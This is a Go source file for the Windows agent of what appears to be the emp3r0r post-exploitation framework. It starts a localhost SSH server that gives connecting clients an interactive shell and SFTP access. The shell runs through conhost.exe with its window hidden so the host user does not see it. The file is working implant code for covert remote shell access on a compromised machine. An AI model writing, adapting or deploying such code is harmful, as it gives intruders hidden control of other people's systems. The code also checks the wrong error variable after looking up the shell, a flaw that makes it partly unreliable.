//go:build windows
// +build windows

package agent

import (
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/gliderlabs/ssh"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"golang.org/x/sys/windows"
)

// SSHD start a ssh server to provide shell access for clients
// the server binds local interface only
func crossPlatformSSHD(shell, port string, args []string) (err error) {
	exe, e := exec.LookPath(shell)
	if err != nil {
		err = fmt.Errorf("%s not found (%v)", shell, e)
		log.Print(err)
		return
	}
	if shell == "elvsh" {
		exe = util.ProcExe(os.Getpid())
	}

	// ssh server
	ssh_server := ssh.Server{
		Addr: "127.0.0.1:" + port,
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
	}

	log.Printf("Using %s shell", strconv.Quote(shell))

	ssh_server.Handle(func(s ssh.Session) {
		cmd := exec.Command(exe, args...)
		if IsConPTYSupported() && runtime.GOARCH == "amd64" {
			log.Print("ConPTY supported, the shell will be interactive")
			conhost_exe, err := exec.LookPath("conhost.exe")
			if err != nil {
				io.WriteString(s,
					fmt.Sprintf("conhost.exe not found, PATH=%s\n",
						os.Getenv("PATH")))
				return
			}
			if len(args) > 0 {
				args = append([]string{exe}, args...)
			} else {
				args = []string{exe}
			}
			cmd = exec.Command(conhost_exe, args...) // shell command
		}
		cmd.Env = os.Environ()
		cmd.Stderr = s
		cmd.Stdin = s
		cmd.Stdout = s

		// Evlsh
		if shell == "elvsh" {
			cmd.Env = append(cmd.Env, "ELVSH=TRUE")
		}

		// remove empty arg in cmd.Args
		var tmp_args []string
		for _, arg := range cmd.Args {
			if strings.TrimSpace(arg) != "" {
				tmp_args = append(tmp_args, arg)
			}
		}
		cmd.Args = tmp_args

		// ConPTY
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: windows.CREATE_NEW_CONSOLE,
		}

		_, cancel := context.WithCancel(context.Background())
		defer cancel()

		// console configs
		ptyReq, winCh, isPTY := s.Pty()
		if isPTY {
			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
		} else {
			log.Print("Got an SSH request")
		}

		log.Printf("sshd execute: %v, args(%d)=%v, env=%s",
			cmd, len(cmd.Args), cmd.Args, cmd.Env)

		if IsConPTYSupported() && isPTY {
			win := <-winCh
			if win.Width <= 0 || win.Height <= 0 {
				log.Printf("w/h is 0, aborting")
			} else {
				cmd.Env = append(cmd.Env, fmt.Sprintf("TERM_SIZE=%dx%d", win.Width, win.Height))
			}
		}
		err = cmd.Start()
		if err != nil {
			log.Printf("Start shell %s: %v", shell, err)
			return
		}
		err = cmd.Wait() // wait until shell process dies
		if err != nil {
			log.Printf("Wait shell %s: %v", shell, err)
			return
		}
	})

	log.Printf("Starting SSHD on port %s...", port)
	return ssh_server.ListenAndServe()
}

// test if ConPTY is implemented in current OS
func IsConPTYSupported() bool {
	k32dll, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return false
	}
	_, err = windows.GetProcAddress(k32dll, "CreatePseudoConsole")
	if err == nil {
		log.Printf("ConPTY is supported")
		return true
	}

	return false
}
